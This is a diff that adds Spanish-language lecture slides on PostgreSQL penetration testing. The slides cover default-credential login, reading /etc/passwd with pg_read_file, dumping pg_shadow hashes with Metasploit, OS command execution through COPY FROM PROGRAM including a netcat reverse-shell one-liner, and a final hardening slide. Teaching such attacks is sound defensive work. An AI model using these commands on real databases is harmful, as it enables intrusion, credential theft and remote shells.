@@ -605,6 +605,69 @@ lcd $\cdot$ lpwd $\cdot$ lls \ \ \# ficheros en TU máquina (local)}
 \end{center}
 \end{frame}
 
+\begin{frame}{PostgreSQL: descubrimiento y acceso con el cliente}
+\small
+  \begin{itemize}
+  \item Además del módulo de Metasploit, se puede interactuar directamente con el servicio (puerto \cmd{5432}) usando el cliente \cmd{psql}. Muchas instalaciones conservan credenciales por defecto (\cmd{postgres:postgres}).
+  \end{itemize}
+\cmdbox{nmap -sV -p5432 <IP>\\
+psql -h <IP> -U postgres\ \ \ \ \# contrasena por defecto: postgres\\
+\textbackslash{}l\ \ \ \ \# listar bases de datos\ \ \ \ \ \textbackslash{}du\ \ \ \ \# listar roles/usuarios}
+\begin{center}\includegraphics[width=\textwidth,height=0.42\textheight,keepaspectratio]{img/pg_access.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{PostgreSQL: lectura de ficheros del sistema}
+\small
+  \begin{itemize}
+  \item Con privilegios de superusuario, PostgreSQL puede \textbf{leer ficheros del host} abusando de sus funciones internas. Dos vías equivalentes:
+  \end{itemize}
+\lead{Con Metasploit}
+\cmdbox{use auxiliary/admin/postgres/postgres\_readfile\\
+set rhosts <IP>\ \ \ \ set rfile /etc/passwd\ \ \ \ run}
+\lead{Manual (desde psql)}
+\cmdbox{SELECT pg\_read\_file('/etc/passwd');}
+\begin{center}\includegraphics[width=\textwidth,height=0.40\textheight,keepaspectratio]{img/pg_readfile.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{PostgreSQL: volcado de hashes de contrasena}
+\small
+  \begin{itemize}
+  \item La tabla interna \cmd{pg\_shadow} almacena los hashes (MD5 o SCRAM-SHA-256) de las contrasenas. El modulo los extrae para \textbf{crackearlos offline} (ver Tema 3.1).
+  \end{itemize}
+\cmdbox{use auxiliary/scanner/postgres/postgres\_hashdump\\
+set rhosts <IP>\ \ \ \ set username postgres\ \ \ \ set password <pass>\ \ \ \ run}
+\begin{center}\includegraphics[width=\textwidth,height=0.50\textheight,keepaspectratio]{img/pg_hashdump.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{PostgreSQL: ejecucion de comandos (COPY FROM PROGRAM)}
+\small
+  \begin{itemize}
+  \item Si el usuario es superusuario, la instruccion \cmd{COPY ... FROM PROGRAM} \textbf{ejecuta comandos del sistema operativo}. Es la tecnica que hay detras del modulo \cmd{postgres\_payload}.
+  \end{itemize}
+\lead{Ejecutar un comando y leer su salida}
+\cmdbox{CREATE TABLE x(o text);\\
+COPY x FROM PROGRAM 'id';\ \ \ \ SELECT * FROM x;}
+\lead{Reverse shell (listener: \cmd{nc -lvp 1234})}
+\cmdbox{COPY x FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc <KALI> 1234 >/tmp/f';}
+\begin{center}\includegraphics[width=\textwidth,height=0.34\textheight,keepaspectratio]{img/pg_copyexec.png}\end{center}
+\fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
+\begin{frame}{PostgreSQL: defensa y hardening}
+\small
+  \begin{itemize}
+  \item \textbf{Red y acceso}: en \cmd{pg\_hba.conf} restringe hosts y metodos de autenticacion; usa \cmd{listen\_addresses='localhost'} si no se necesita acceso remoto.
+  \item \textbf{Minimo privilegio}: la aplicacion \textbf{nunca} debe conectarse como superusuario ---\cmd{COPY FROM PROGRAM} y \cmd{pg\_read\_file} lo requieren---; crea roles limitados.
+  \item \textbf{Credenciales}: contrasenas fuertes y unicas, rotacion y \cmd{SCRAM-SHA-256} (no MD5).
+  \item \textbf{Parcheado y cifrado}: PostgreSQL al dia; TLS en transito y cifrado de datos en reposo.
+  \item \textbf{Monitorizacion}: alerta ante \cmd{COPY ... FROM PROGRAM}, uso de superusuario y logins fallidos.
+  \end{itemize}
+\fuente{Fuente: \href{https://www.hackingarticles.in/postgresql-penetration-testing/}{PostgreSQL Penetration Testing} --- Hacking Articles.}
+\end{frame}
+
 \begin{frame}{IRC: puerta trasera en UnrealIRCd}
 \small
   \begin{itemize}
